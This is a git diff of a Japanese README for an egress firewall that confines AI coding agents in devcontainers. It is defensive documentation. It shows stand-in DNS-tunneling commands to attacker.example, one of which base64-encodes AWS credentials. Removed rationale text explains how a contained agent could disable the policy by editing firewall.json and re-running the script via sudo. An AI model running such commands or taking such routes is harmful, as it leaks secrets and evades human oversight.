@@ -13,68 +13,41 @@ allowlist に載っていない宛先への外向き通信を遮断し、DNS を
 ## できること
 
 * **漏洩先の限定** — allowlist 外への外向き通信を DROP します
-* **DNS 経路の固定** — 53 番宛は、コンテナに割り当てられたリゾルバ以外すべて DROP します（**任意のネームサーバーへ直接投げる経路は塞がりますが、DNS トンネリングそのものは防げません**。後述）
-* **踏み台化の防止** — INPUT / OUTPUT / FORWARD すべて default DROP、IPv4 / IPv6 両方に適用します
-* **プロジェクト単位の追加許可** — repo 内の `firewall.json` で許可先を足せます
+* **DNS 経路の固定** — 53 番宛は、割り当てられたリゾルバ以外すべて DROP します
+* **踏み台化の防止** — INPUT / OUTPUT / FORWARD すべて default DROP、IPv4 / IPv6 両方
+* **プロジェクト単位の追加許可** — `firewall.json` で許可先を足せます
 
 ## できないこと（設計上の非目標）
 
-* **悪性コンテンツの流入防止はしません。** allowlist に GitHub や npm がある時点で任意のコンテンツは入ってきます
-* **完全な exfil 防止は保証しません。** 許可済みドメインへの GET クエリ経由など、低帯域の漏洩経路は残ります。ここは egress 制御ではなく、クレデンシャル側（prod キーを置かない、fine-grained PAT を使う）で受け止める前提です
-* **DNS トンネリングは防げません。** 53 番の宛先はリゾルバ 1 つに固定しますが、**そのリゾルバは再帰問い合わせをします。** `dig <秘密をエンコードした名前>.attacker.example` は正規のリゾルバ経由で攻撃者の権威ネームサーバーに届きます。詳細は [DNS リゾルバ](#dns-リゾルバ) を参照してください
-* **L7 制御（HTTP メソッド別・パス別）はしません。** 将来 proxy に移行する際の担当範囲です
+* **悪性コンテンツの流入防止** — allowlist に GitHub や npm がある時点で任意のコンテンツは入ります
+* **完全な exfil 防止** — 許可済みドメインへの GET クエリ経由など、低帯域の漏洩経路は残ります
+* **DNS トンネリングの遮断** — 許可したリゾルバが再帰問い合わせをするため、L3/L4 では原理的に不可能です
+* **L7 制御（メソッド別・パス別）** — 将来 proxy に移行する際の担当範囲です
+
+**想定している敵はコンテナ内で動くエージェント自身**です。前提と、各非目標を受容した理由は [`docs/design.md`](./docs/design.md) §1・§3。
 
 ---
 
 # 動作の概要
 
-`postStartCommand` から root 権限で実行され、以下の順序でポリシーを適用します。
+`postStartCommand` から root 権限で実行されます。
 
-1. `firewall.json` を読み込み、スキーマを検証する（**検証失敗はここで exit≠0。panic テーブルが適用されます**）
-2. **先にネットワークを閉じる**
-   * IPv6 は最終状態（全 DROP）へ。以降、再オープンしません
-   * IPv4 は bootstrap テーブル（loopback、割り当てられたリゾルバの 53 番、確立済みセッション、sshd のみ許可）へ
-3. 閉じた状態のまま、DNS だけを使って allowlist を構築する（staging ipset に投入）
-4. `ipset swap` で allowlist を差し替え、本番のフィルタテーブルを `iptables-restore` で一括適用する
-5. GitHub meta API から CIDR を取得して追加する（best effort。失敗しても DNS 解決済みの GitHub ホストは許可済み）
-6. 自己検証を実行する（失敗すれば exit≠0）
+1. **先にネットワークを閉じる** — IPv6 は最終状態（全 DROP）へ、IPv4 は bootstrap テーブル（loopback・リゾルバ・確立済みセッション・sshd のみ）へ
+2. 閉じた状態のまま、DNS だけを使って allowlist を構築する
+3. `ipset swap` で差し替え、本番のフィルタテーブルを `iptables-restore` で一括適用する
+4. 自己検証を実行する
 
-自己検証で使うプローブは、実際に対象外であることを確認してから選ばれます。外部 DNS のプローブは「設定済みリゾルバではないアドレス」、未許可先のプローブは「allowlist に載っていないホスト」です（`example.com` → `example.net` → `example.org` の順に試します）。そのため、これらを `allowDomains` に入れても自己検証は壊れません。
+**リビルド中に外部ネットワークを必要とする工程はありません。** 途中で強制終了されても「開いたまま固定される」状態になりません。
 
-**リビルド中に外部ネットワークを必要とする工程はありません。** そのため、途中で強制終了されても「開いたまま固定される」状態にはなりません。
+**失敗したら panic テーブル**（loopback と確立済み sshd 応答のみ許可、他は全 DROP）を適用して exit≠0 します。`firewall.json` の検証エラーも同様です。`iptables` が使えると確認する前の失敗だけは、panic テーブルすら適用できないためルール未適用で終了します。
 
-いずれかの工程で失敗した場合は panic テーブル（loopback と確立済み sshd 応答のみ許可、他は全 DROP）を適用したうえで exit≠0 します。`postStartCommand` の失敗としてユーザーに見える状態になります。
-
-**`firewall.json` の検証エラーも panic に倒します。** 「設定ミスで既存のルールを乱すべきではない」という考え方もありますが、それが成り立つのは再適用時だけです。初回起動時の「直前のポリシー」は既定の全 ACCEPT なので、何も適用せずに終了するとコンテナは開いたまま残ります。タイプミスは `--check-config` で再ビルド前に見つけてください。
-
-`iptables` が使えると確認する前（root 権限が無い、必須コマンドが無い）の失敗だけは、panic テーブルすら適用できないためルール未適用で終了します。
+処理順序の詳細は [`docs/spec.md`](./docs/spec.md) §4.2、その根拠は [`docs/design.md`](./docs/design.md) §2.2・§2.8。
 
 ---
 
 # 必要な環境
 
-## Docker の実行権限
-
-`NET_ADMIN` と `NET_RAW` が必要です。**書く場所は構成で変わります**（[capability の付け方](#capability-の付け方は構成で変わる)）。
-
-```yaml
-# Docker Compose を使う場合（推奨）: .devcontainer/docker-compose.yml
-services:
-  dev:
-    cap_add:
-      - NET_ADMIN
-      - NET_RAW
-```
-
-```jsonc
-// build + runArgs の場合: .devcontainer/devcontainer.json
-"runArgs": [
-  "--cap-add=NET_ADMIN",
-  "--cap-add=NET_RAW"
-]
-```
-
-## コンテナ内に必要なパッケージ
+コンテナ内に次が必要です。配置の仕方は[セットアップ](#セットアップ)。
 
 | パッケージ | 用途 |
 |---|---|
@@ -86,11 +59,7 @@ services:
 | `curl` | GitHub meta API の取得、自己検証 |
 | `aggregate` | GitHub CIDR の集約（任意。無い場合は警告のみ） |
 
-```dockerfile
-RUN apt-get update && apt-get install -y --no-install-recommends \
-  iptables ipset iproute2 dnsutils jq curl aggregate \
-  && apt-get clean && rm -rf /var/lib/apt/lists/*
-```
+capability は `NET_ADMIN` と `NET_RAW`。**書く場所は構成で変わります**（[capability の付け方](#capability-の付け方は構成で変わる)）。
 
 ## DNS リゾルバ
 
@@ -98,105 +67,22 @@ RUN apt-get update && apt-get install -y --no-install-recommends \
 
 `nameserver` に IPv4 アドレスが 1 つも無い場合は、固定を緩めるのではなく **exit≠0 で停止します**。
 
-### この固定で防げること・防げないこと
+> **これで DNS トンネリングは防げません。** 許可されたリゾルバは再帰問い合わせをするため、`dig <秘密をエンコードした名前>.attacker.example` は通ります。**埋め込みリゾルバでも同じです。** 受容している残余リスクとして扱っています（[`docs/design.md`](./docs/design.md) §3.1）。
 
-**防げる:** 攻撃者が用意したネームサーバーへ直接問い合わせる経路。`dig @attacker.example ...` は DROP され、`egress-audit-v4` に記録が残ります。
+## ネットワーク構成（推奨）
 
-**防げない: DNS トンネリング。** 許可されたリゾルバは**再帰問い合わせ**をします。したがって次は通ります。
+**推奨は「ユーザー定義ネットワークを、プロジェクトごとに 1 つ」です。**
 
-```sh
-dig "$(base64 < ~/.aws/credentials | tr -d '\n' | cut -c1-60).exfil.attacker.example"
-```
+* Docker の埋め込みリゾルバ `127.0.0.11` は**ユーザー定義ネットワーク上でのみ**提供されます。デフォルトブリッジではホスト側の DNS アドレスが直接書かれ、**そのアドレスの 53 番へ外向きの穴を 1 つ開ける**ことになります。埋め込みリゾルバならパケットが eth0 から出ないため、この穴自体が不要になります
+* **1 つのネットワークを全プロジェクトで共有しないでください。** 同居するコンテナは相互に到達でき、埋め込み DNS がコンテナ名で解決できてしまいます
 
-問い合わせは正規のリゾルバに向かい、リゾルバが上流へ転送し、攻撃者の権威ネームサーバーにラベルが届きます。TXT レスポンスで戻りチャネルも作れます。**これは埋め込みリゾルバ `127.0.0.11` でも同じです**（Docker デーモンが上流へ転送するため、コンテナの OUTPUT チェーンは上流パケットを見ません）。
+どちらも**このパッケージの必須要件ではありません。** スクリプトはどちらの構成でも動き、埋め込みリゾルバでなければ警告を出すだけです。
 
-リゾルバの選択では解決しません。塞ぐには L7 proxy か、応答するゾーンを制限する DNS 側のフィルタが要ります。**受容している残余リスク**として扱っています（[known-issues](./docs/known-issues.md) 項目 13）。
+判断の根拠（ホストの OS で影響が変わること、埋め込みリゾルバのデメリット、共有時に守れない点）は [`docs/design.md`](./docs/design.md) §4 を参照してください。
 
-### ユーザー定義ネットワークを使う（推奨）
+### 案 A: Docker Compose を使う（推奨）
 
-Docker の埋め込みリゾルバ `127.0.0.11` は、**ユーザー定義ネットワーク上でのみ**提供されます。`--network` を指定せずに起動したコンテナはデフォルトブリッジに入り、`/etc/resolv.conf` にはホスト側の DNS アドレスが直接書かれます。
-
-```sh
-$ cat /etc/resolv.conf
-nameserver 192.168.65.7          # デフォルトブリッジの場合（Docker Desktop）
-nameserver 127.0.0.11            # ユーザー定義ネットワークの場合
-```
-
-どちらでも動作しますが、**埋め込みリゾルバのほうが強い**設定です。
-
-| | 許可される宛先 | パケットの行き先 |
-|---|---|---|
-| 埋め込みリゾルバ | `127.0.0.11:53` | **コンテナ自身の netns 内。eth0 から出ない** |
-| ホストのリゾルバ | 例 `192.168.65.7:53` | **eth0 から実際に出る**。実在のネットワーク上のサービスに届く |
-
-#### ホストのリゾルバを許可するとは何が起きることか
-
-**「実在のネットワーク機器に、ポート 53 で到達できる経路が 1 本開く」**ということです。
-
-情報の取得（内部名の列挙など）は、**埋め込みリゾルバでも同じように可能**です。どちらのリゾルバも上流へ転送するため、`dig jenkins.corp.local` は両方で解決します。**リゾルバの選択で変わるのは、到達性（実在の機器にパケットが届くか）だけです。**
-
-その到達性がどれだけ問題になるかは、ホストの OS で大きく変わります。
-
-**Docker Desktop（macOS / Windows）の場合 — 影響は小さい**
-
-コンテナは Linux VM の中で動いており、`192.168.65.0/24` は **VM の内部ネットワーク**です。
-
-* `192.168.65.7` — Docker Desktop の DNS フォワーダ（VM 内のサービス）
-* `192.168.65.254` — `host.docker.internal`（ホスト OS 自身）
-
-許可されるのは `.7` の 53 番だけで、**この相手は VM 内で DNS 転送しかしていないコンポーネント**です。物理 LAN 上の機器ではありません。したがって「LAN に穴が開く」状態にはなりません。
-
-**Linux ホストの場合 — 影響は大きい**
-
-VM が挟まりません。デフォルトブリッジでは、Docker が**ホストの `/etc/resolv.conf` の nameserver をそのままコンテナに書き込みます**。したがって許可先は次のような**実在の機器**になります。
-
-* `192.168.1.1` — 家庭用ルータ
-* `10.0.0.53` — 社内 DNS サーバー
-* VPN 接続中なら、その先の DNS サーバー
-
-**サンドボックスから、その機器の 53 番に到達できる状態になります。** ポートは 53 に限られますが、
-
-* その DNS 実装の脆弱性、動的更新、キャッシュポイズニングは射程に入ります
-* コンテナは「LAN 上の機器と通信できないはず」の前提が崩れます
-
-`allowCidrs` は RFC1918 を拒否しますが、**`resolv.conf` 由来のリゾルバアドレスはこの検証を通りません**（通したら名前解決が成立しないため）。つまり **RFC1918 の実機に、意図的に穴を 1 つ開けています。** 埋め込みリゾルバならこの穴自体が不要になります。
-
-加えて Linux ホストでは動作上の利点もあります。ホストが `systemd-resolved`（`127.0.0.53`）を使っている場合、デフォルトブリッジでは Docker がループバックを除外して **`8.8.8.8` / `8.8.4.4` にフォールバック**します。埋め込みリゾルバならデーモン経由でホスト本来のリゾルバが使われ、社内名の解決も期待どおりに動きます。
-
-#### 埋め込みリゾルバのデメリット
-
-「無い」わけではありません。
-
-* **ユーザー定義ネットワークが前提になる** — 作成の手間、アドレスプールの枯渇（Docker 既定では 30 個前後）、不要になったネットワークの掃除（`docker network prune`）
-* **nat テーブルに Docker の DNS DNAT ルールが増える** — 本スクリプトは nat を触らないため共存しますが、この構成での確認は[検証待ち](./docs/known-issues.md)です
-* **同一ネットワーク上のコンテナ名が引ける** — 埋め込み DNS の本来機能。ネットワークをプロジェクトごとに分ければ影響は自分のスタック内に閉じます
-* **Docker デーモンへの依存が 1 段増える** — デーモンの DNS 機能が壊れると名前解決が止まります
-* **DNS の観測性はむしろ下がる** — ホストのリゾルバ宛なら、ホスト側で `tcpdump` してどのコンテナが何を問い合わせたか追えます。埋め込みリゾルバではデーモンが集約するため、コンテナ単位の帰属が取りにくくなります
-
-### ネットワークはプロジェクトごとに分ける
-
-**1 つのネットワークを全プロジェクトで共有しないでください。** 同じユーザー定義ネットワーク上のコンテナは相互に到達でき、埋め込み DNS が**コンテナ名で名前解決できてしまいます**。
-
-egress-guard は大部分を守ります（相手の IP はブリッジのサブネット = RFC1918 で allowlist に載らないため REJECT）。ただし守れない面が残ります。
-
-* **`sshdPort`（既定 22）は INPUT で `NEW` を許可しています。** 同居する全コンテナから叩ける口になります
-* **firewall 適用前の窓** — `postStartCommand` 完了までは無防備です
-* **egress-guard を入れていないコンテナ**が同居していれば、そちらは無制限です
-
-分ければこれらは最初から発生しません。コストはほぼゼロです。
-
-### 推奨構成
-
-> **どちらもこのパッケージの必須要件ではありません。** スクリプトは割り当てられたリゾルバを読んで動作し、埋め込みリゾルバでなければ警告を出すだけです。ネットワーク構成は利用側の Docker / devcontainer の領分であり、ここでは推奨を示すに留めます。
-
-#### 案 A: Docker Compose を使う
-
-**Compose はプロジェクトごとのユーザー定義ネットワーク（`<project>_default`）を自動で作ります。** そのため次がまとめて解決します。
-
-* `initializeCommand` が不要
-* `--network` の指定が不要
-* プロジェクトごとの分離が自動
-* `docker compose down` でネットワークも消えるため、アドレスプールが枯渇しにくく `prune` も不要
+**Compose はプロジェクトごとのユーザー定義ネットワーク（`<project>_default`）を自動で作ります。** `initializeCommand` も `--network` も不要で、`docker compose down` でネットワークも消えます。
 
 ```yaml
 # .devcontainer/docker-compose.yml
@@ -228,7 +114,7 @@ services:
 
 **注意:** `dockerComposeFile` を使うと `runArgs` は無視されます。`--cap-add` は `cap_add`、`mounts` は `volumes` に書き換えてください。
 
-#### 案 B: `initializeCommand` でネットワークを用意する
+### 案 B: `initializeCommand` でネットワークを用意する
 
 Compose に移行しない場合はこちらです。ネットワーク名にプロジェクト名を含めることで、**設定文字列を全プロジェクトで同一にしたまま**分離できます。
 
@@ -244,7 +130,7 @@ Compose に移行しない場合はこちらです。ネットワーク名にプ
 
 > 使い終わったネットワークは `initializeCommand` では消えません。案 B を採る場合は定期的に `docker network prune` してください。
 
-#### デフォルトブリッジのまま運用する場合
+### デフォルトブリッジのまま運用する場合
 
 非推奨ですが動作します。起動時に次の警告が出ます。
 
@@ -316,29 +202,10 @@ USER node
 
 | 構成 | 書く場所 |
 |---|---|
-| Docker Compose（[案 A](#案-a-docker-compose-を使う)。推奨） | `docker-compose.yml` の `cap_add` |
+| Docker Compose（[案 A](#案-a-docker-compose-を使う推奨)。推奨） | `docker-compose.yml` の `cap_add` |
 | `build` + `runArgs`（[案 B](#案-b-initializecommand-でネットワークを用意する)） | `devcontainer.json` の `runArgs` |
 
-**`dockerComposeFile` を使うと `runArgs` は無視されます。** Compose 構成では `devcontainer.json` に `runArgs` を書いても効きません。
-
-```yaml
-# 案 A: .devcontainer/docker-compose.yml
-services:
-  dev:
-    cap_add:
-      - NET_ADMIN
-      - NET_RAW
-```
-
-```jsonc
-// 案 B: .devcontainer/devcontainer.json
-"runArgs": [
-  "--cap-add=NET_ADMIN",
-  "--cap-add=NET_RAW"
-]
-```
-
-ネットワーク構成の推奨は [ネットワークはプロジェクトごとに分ける](#ネットワークはプロジェクトごとに分ける) を参照してください。
+**`dockerComposeFile` を使うと `runArgs` は無視されます。** Compose 構成では `devcontainer.json` に `runArgs` を書いても効きません。具体的な書き方は[ネットワーク構成（推奨）](#ネットワーク構成推奨)の各案を参照してください。
 
 ## 配置はスクリプトが検証します
 
@@ -352,60 +219,27 @@ services:
 
 sudoers の書き間違い（末尾 `""` の欠落）は、スクリプト側が `SUDO_USER` 付きの引数実行を拒否することで無効化されます。
 
-> **検証の限界。** 悪意をもって差し替えられたスクリプトに対しては、これらの検証は意味を持ちません（差し替えた側が検証コードごと消せます）。捕まえられるのは**設定ミス**であり、それがこの手順で現実に起きる失敗です。詳細は [`docs/known-issues.md`](./docs/known-issues.md) の項目 14。
+> **検証の限界。** 悪意をもって差し替えられたスクリプトに対しては、これらの検証は意味を持ちません（差し替えた側が検証コードごと消せます）。捕まえられるのは**設定ミス**であり、それがこの手順で現実に起きる失敗です。詳細は [`docs/design.md`](./docs/design.md) §3.4。
 
 ---
 
-## 補足: なぜこの置き方なのか
+## なぜこの置き方なのか
 
-**読まなくてもセットアップはできます。** 上の手順から逸脱するときに読んでください。
+要点だけ。詳細は [`docs/design.md`](./docs/design.md) を参照してください。
 
-### スクリプトを `node_modules` から実行してはいけない
+| 決まりごと | 理由 |
+|---|---|
+| スクリプトを `node_modules` から実行しない | 非特権ユーザーが書き込める場所を sudo 対象にすると、**エージェントがスクリプト本体を書き換えて root 実行**できます（[design §2.16](./docs/design.md)） |
+| sudoers の末尾 `""` | Cmnd に引数を書かないと「**任意の引数で実行してよい**」という意味になります（[design §2.16](./docs/design.md)） |
+| `firewall.json` を `/etc/egress-guard/` に置く | エージェントは再適用をいつでも実行できます。**再適用が読むファイルをエージェントが書き換えられるなら、root を取らずに 2 手でポリシーが無効になります**（[design §2.1](./docs/design.md)） |
+| `chattr +i` を使わない | Docker の既定 capability では失敗し、防御価値も限定的（[design §2.16](./docs/design.md)） |
 
-sudoers が指すパスが `node_modules` の中にあると、**エージェントがスクリプト本体を書き換えて root で実行できます。** `node_modules` は非特権ユーザーが書き込める場所です。必ず `/usr/local/bin/` へコピーし、`root:root` 所有にしてください。
-
-成立している防御は次の 2 点です。
-
-* ファイルが `root:root` 所有・`755`・`/usr/local/bin` 配下にあり、`node` に書き込み権限がない
-* `node` に許可された sudo が当該スクリプトの引数なし実行のみで、`chattr` も `cp` も実行できない
-
-> **`chattr +i` は使いません。** `CAP_LINUX_IMMUTABLE` は Docker のデフォルト capability セットに含まれず、`docker build` の `RUN` であっても失敗します。加えて `chattr +i` が守るのは「root を取った攻撃者による書き換え」ですが、root を取られた時点で `chattr -i` も打てるため防御価値は限定的です。詳細は [`docs/known-issues.md`](./docs/known-issues.md) の項目 5。
-
-### sudoers の末尾 `""` が必須な理由
-
-sudoers の仕様では、**Cmnd に引数を書かないと「任意の引数で実行してよい」という意味になります。** 引数なしのみを許可するには、空の引数リスト `""` を明示する必要があります。
-
-```
-# NG: 任意の引数を許してしまう
-node ALL=(root) NOPASSWD: /usr/local/bin/init-project-firewall.sh
-
-# OK: 引数なしのみ許可
-node ALL=(root) NOPASSWD: /usr/local/bin/init-project-firewall.sh ""
-```
-
-スクリプト側でも `SUDO_USER` / `SUDO_UID` が設定された状態で引数が渡された場合は拒否します（多重防御）。sudoers を正しく書いていれば、そもそもここには到達しません。
-
-### repo の `firewall.json` を直接読ませない理由
-
-このファイアウォールが想定している敵は**コンテナ内で動くエージェント自身**です。そしてエージェントは sudoers により、いつでも再適用を実行できます。
-
-再適用が読むファイルをエージェントが書き換えられるなら、次の 2 手でポリシー全体が無効になります。
-
-1. `firewall.json` に `{"mode": "audit"}` あるいは `{"allowDomains": ["attacker.example"]}` と書く（**構文的に正当なのでバリデーションは通ります**）
-2. `sudo /usr/local/bin/init-project-firewall.sh` を実行する
-
-root は取られていませんが、目的は達成されています。したがって効力を持つ設定は root 所有でなければなりません。
-
-この分離により、次の 2 つが別の操作になります。
+repo 内の `.devcontainer/firewall.json` が「ソース」で、`/etc/egress-guard/firewall.json` が「実効設定」という分離により、次の 2 つが別の操作になります。
 
 | 操作 | 誰が | 必要なもの |
 |---|---|---|
 | 再解決（CDN の IP 変動への追随） | エージェントでも可 | 再適用のみ |
 | ポリシー変更 | 人間 | repo の編集 + イメージ再ビルド |
-
-スクリプトは `/etc/egress-guard/firewall.json` とその親ディレクトリが root 所有かつグループ・その他から書き込み不可であること、および symlink でないことを実行時に確認します。ワークスペース上のファイルを bind mount で被せた場合はここで停止します。
-
-`audit` モードで試行錯誤する間も再ビルドが必要になりますが、audit の収集フェーズは人間が回すものなので許容範囲と判断しています。
 
 ---
 
@@ -413,7 +247,7 @@ root は取られていませんが、目的は達成されています。した
 
 プロジェクト固有の追加許可を書きます。
 
-**読まれるのは `/etc/egress-guard/firewall.json` だけです。** 見つからない場合は基底プロファイルのみで動作します。理由は[repo の `firewall.json` を直接読ませない理由](#repo-の-firewalljson-を直接読ませない理由) を参照してください。
+**読まれるのは `/etc/egress-guard/firewall.json` だけです。** 見つからない場合は基底プロファイルのみで動作します。理由は[なぜこの置き方なのか](#なぜこの置き方なのか)を参照してください。
 
 repo 側の `.devcontainer/firewall.json` はそのソースであり、**イメージを再ビルドしたときに反映されます。** 再ビルド前に内容を検証したい場合は、パスを明示して `--check-config` にかけてください。
 
@@ -469,32 +303,29 @@ cp node_modules/@himorogy/egress-guard/templates/firewall.json .devcontainer/fir
 
 ## 拒否される値
 
-効力を持つ `firewall.json` は root 所有ですが、その内容は repo から来る以上、**攻撃者が書いたデータとして扱います。** 以下は root 側のスクリプトが検証段階で拒否します。
+効力を持つ `firewall.json` は root 所有ですが、その内容は repo から来る以上、**攻撃者が書いたデータとして扱います。** 主なものは次のとおりです（完全な一覧は [`docs/spec.md`](./docs/spec.md) §3.2）。
 
 * **`*` を含むドメイン**（`*.example.com`、`*`、`*.com` など。[理由](#ワイルドカードドメインは使えません)）
 * ドメイン名として不正な文字列（シェルのメタ文字、空白、改行など）
-* `0.0.0.0/0`、`::/0`、プレフィックス長 8 未満の CIDR
-* プライベートアドレス帯を含む CIDR
-  * RFC1918（`10/8`、`172.16/12`、`192.168/16`）
-  * **`100.64.0.0/10`（CGNAT）** — ホストに Tailscale 網が繋がっている場合の横移動対策
-  * loopback、link-local、multicast / reserved
+* `0.0.0.0/0`、プレフィックス長 8 未満の CIDR
+* プライベートアドレス帯を含む CIDR — RFC1918、**CGNAT（`100.64.0.0/10`）**、loopback、link-local、multicast / 予約
   * 前方一致ではなく数値レンジの重複判定を行うため、`100.0.0.0/8` のような包含するスーパーネットも拒否します
 * 範囲外のポート番号
+
+**同じ検査は DNS 応答にも掛かります。** 許可したドメインが `169.254.169.254` を返しても allowlist には入りません（[`docs/design.md`](./docs/design.md) §2.9）。
 
 `firewall.json` は **PR レビュー必須ファイル**として扱ってください。
 
 ## ホストゲートウェイの扱い
 
-ホスト網は**既定で不許可**です。ホストには Tailscale 網などが繋がっている可能性があり、包括的に許可すると横移動の経路になるためです。
+ホスト網は**既定で不許可**です。必要なポート（ローカル DB など）だけを `allowHostPorts` で開けてください。
 
-必要なポート（ローカル DB など）だけを `allowHostPorts` で開けてください。許可されるのは**ホストを指すアドレス宛の指定 TCP ポートのみ**で、ホストのサブネット全体ではありません。
-
-許可対象になるアドレスは次の 2 つです。
+許可されるのは**ホストを指すアドレス宛の指定 TCP ポートのみ**で、サブネット全体ではありません。対象は次の 2 つです。
 
 * デフォルトゲートウェイの IP（`ip route show default`）
-* `host.docker.internal` の解決結果
+* `host.docker.internal` の解決結果（私設アドレスであることを検証）
 
-**Docker Desktop ではこの 2 つが別のアドレスになることがあります。** ゲートウェイだけを許可すると、ホスト上のローカル DB に届きません。両方を開けるのはそのためです。
+**Docker Desktop ではこの 2 つが別のアドレスになります。** 実測ではゲートウェイ経由でホストに届かず、`host.docker.internal` 側でのみ到達しました（[`docs/design.md`](./docs/design.md) §2.15）。
 
 どちらも取得できない状態で `allowHostPorts` が指定されている場合は、要求された許可を黙って落とすのではなく exit≠0 で停止します。
 
@@ -568,14 +399,9 @@ ipset flush egress-audit-v4
 
 > `SET` ターゲットが使えないカーネルでは、この記録ルールを外した構成に自動でフォールバックします。その場合は起動ログに `retrying without the blocked-destination recorder` が出ます。
 
-### カーネルログ（環境依存・当てにしない）
+### カーネルログ（当てにしない）
 
-`fw-drop:` / `fw-audit:` / `fw-dns-drop:` / `fw-drop6:` の `LOG` ルールも入っていますが、**多くの環境では出力されません。**
-
-* コンテナ内の `dmesg` は `CAP_SYSLOG` が無いため読めない
-* `net.netfilter.nf_log_all_netns` が既定の `0` の場合、カーネルが非初期ネットワーク名前空間からのログを抑制する
-
-つまりホストから読んでも出てきません。詳細と有効化方法は [`docs/known-issues.md`](./docs/known-issues.md) の項目 4 を参照してください。**運用の前提にしないでください。**
+`fw-drop:` / `fw-audit:` / `fw-dns-drop:` / `fw-drop6:` の `LOG` ルールも入っていますが、**多くの環境では出力されません**（コンテナ内の `dmesg` は `CAP_SYSLOG` が無く読めない。`net.netfilter.nf_log_all_netns` が既定 `0` のためホストからも読めない）。**運用の前提にしないでください。** 経緯と却下した回避策は [`docs/design.md`](./docs/design.md) §2.11。
 
 ## 再適用
 
@@ -617,39 +443,23 @@ panic テーブルが適用され、loopback 以外の通信はできない状�
 
 # 開発
 
-## テスト
-
 ```sh
-pnpm test          # 設定バリデーション + ルール適用の両方
+pnpm test          # 設定バリデーション + ルール適用
+pnpm lint:sh       # shellcheck
 ```
 
 * `tests/firewall-config.test.sh` — `firewall.json` のスキーマ検証と各バリデータ
 * `tests/firewall-rules.test.sh` — `iptables` / `ipset` / `dig` / `curl` などを記録型スタブに差し替え、生成されるフィルタテーブルとコマンド順序を検証します（root 不要）
 
-```sh
-pnpm lint:sh       # shellcheck（要 shellcheck、または npx shellcheck）
-```
-
-## 開発用オプション
-
-```sh
-# インストール済みの設定を検証して終了（ルールには一切触れない）
-init-project-firewall.sh --check-config
-
-# 固定のパスではなく指定したファイルを読む（再ビルド前の検証）
-init-project-firewall.sh --check-config --config .devcontainer/firewall.json
-
-# resolv.conf を差し替える（テスト用）
-init-project-firewall.sh --check-config --resolv-conf ./resolv.conf
-```
-
-いずれも開発・テスト専用です。**`sudo` 経由で引数が渡された場合は拒否されます。** 適用される設定は常に `/etc/egress-guard/firewall.json` で、`--config` からは動かせません。
+開発用オプション（`--check-config` / `--config` / `--resolv-conf`）は [`docs/spec.md`](./docs/spec.md) §8。いずれも **`sudo` 経由で引数が渡された場合は拒否されます。**
 
 ---
 
 # 既知の課題・制限
 
-一覧は [`docs/known-issues.md`](./docs/known-issues.md) を参照してください。運用上つまずきやすいものを以下に挙げます。
+**仕様として決まっている制限**は [`docs/spec.md`](./docs/spec.md) §9、その根拠は [`docs/design.md`](./docs/design.md)。**まだ解決していないもの**は [`docs/known-issues.md`](./docs/known-issues.md) にあります。
+
+運用でつまずきやすいものを以下に挙げます。
 
 ## ワイルドカードドメインは使えません
 
@@ -662,13 +472,7 @@ List the host names you need instead; run in audit mode and read ipset egress-au
 out which ones those are.
 ```
 
-### 理由
-
-このファイアウォールは、ドメイン名を**起動時に IP へ解決して ipset に載せる**方式です。パケットを見る時点ではドメイン名は存在せず、宛先 IP しかありません。
-
-そして **DNS には「あるゾーンのサブドメインを列挙する」手段がありません。** `*.example.com` を IP の集合に展開することは原理的にできません。
-
-そのため、ワイルドカードを受理しても実現できるのは apex（`example.com`）の解決だけで、`api.example.com` も `db.example.com` も遮断されたままになります。**セキュリティ設定において「受理するが実現しない」のは最悪の性質です。** 設定を書いた人は「サブドメイン全体が通っている」と信じ、実際には通っていません。警告ではこの誤認を防げないため、拒否します。
+**DNS には「あるゾーンのサブドメインを列挙する」手段がありません。** ドメイン名は起動時に IP へ解決して ipset に載せる方式なので、ワイルドカードを展開できません。受理して apex だけ許可する案を採らなかった理由は [`docs/design.md`](./docs/design.md) §2.10。
 
 **回避策: 必要なホスト名を具体的に列挙してください。**
 
@@ -684,56 +488,24 @@ out which ones those are.
 
 どのホスト名が必要かわからない場合は `mode: "audit"` で運用し、`egress-audit-v4` に溜まった IP から逆引き（あるいは TLS 証明書の SAN）で特定してください。
 
-ワイルドカード対応は L7 proxy（SNI ベースのフィルタリング）への移行時に扱う課題です。proxy であればパケットにドメイン名が乗るため、展開せずにマッチできます。スキーマ version 2 での導入を想定しています。
-
 ## 許可済みドメインへの GET 経由の漏洩は防げません
 
-L3/L4 では HTTP メソッドもパスも見えないため、`allowDomains` に入れたドメインへ「クエリ文字列に秘密を載せた GET」を投げる経路は残ります。これは設計上の非目標であり、クレデンシャル側で受け止める前提です。
-
-## Web 検索・Web 取得は使えます
-
-egress 規制下でも Claude Code の WebSearch / WebFetch は動作します。allowlist を広げる必要はありません。詳細と注意点は [`docs/web-search-fetch.md`](./docs/web-search-fetch.md) を参照してください。
+L3/L4 では HTTP メソッドもパスも見えないため、`allowDomains` に入れたドメインへ「クエリ文字列に秘密を載せた GET」を投げる経路は残ります。設計上の非目標であり、クレデンシャル側で受け止める前提です。
 
 ## DNS トンネリングは防げません
 
-53 番の宛先はリゾルバ 1 つに固定しますが、**そのリゾルバは再帰問い合わせをします。** 詳細と対策の選択肢は [`docs/known-issues.md`](./docs/known-issues.md) の項目 13 を参照してください。
+53 番の宛先はリゾルバ 1 つに固定しますが、**そのリゾルバは再帰問い合わせをします。** [`docs/design.md`](./docs/design.md) §3.1。
 
----
+## Web 検索・Web 取得
 
-# FUTURE WORK
+egress 規制下でも Claude Code の WebSearch / WebFetch は使えると考えられます。**ただしこれは未実測です。** 根拠と確認手順は [`docs/web-search-fetch.md`](./docs/web-search-fetch.md)。
 
 ## 未検証の環境
 
-実機検証（[`docs/verification-checklist.md`](./docs/verification-checklist.md)）は **Docker Desktop（macOS / arm64、linuxkit カーネル 6.12.76）** で、デフォルトブリッジとユーザー定義ネットワークの両方について完了しています。以下は**環境を用意できていないため未検証**です。
+実機検証（[`docs/verification-record.md`](./docs/verification-record.md)）は **Docker Desktop（macOS / arm64）** で、デフォルトブリッジとユーザー定義ネットワークの両方について完了しています。次は環境を用意できておらず未検証です。
 
-### IPv6 が有効なコンテナ
+* **IPv6 が有効なコンテナ** — 検証環境には `lo` の `::1` しか IPv6 アドレスがありません
+* **Linux ホスト上の Docker** — 検証はすべて linuxkit VM 上です。デフォルトブリッジのリゾルバが実在の LAN 機器になる点、`systemd-resolved` 環境での挙動が未確認
+* **CI ランナー / クラウド開発環境 / rootless Docker**
 
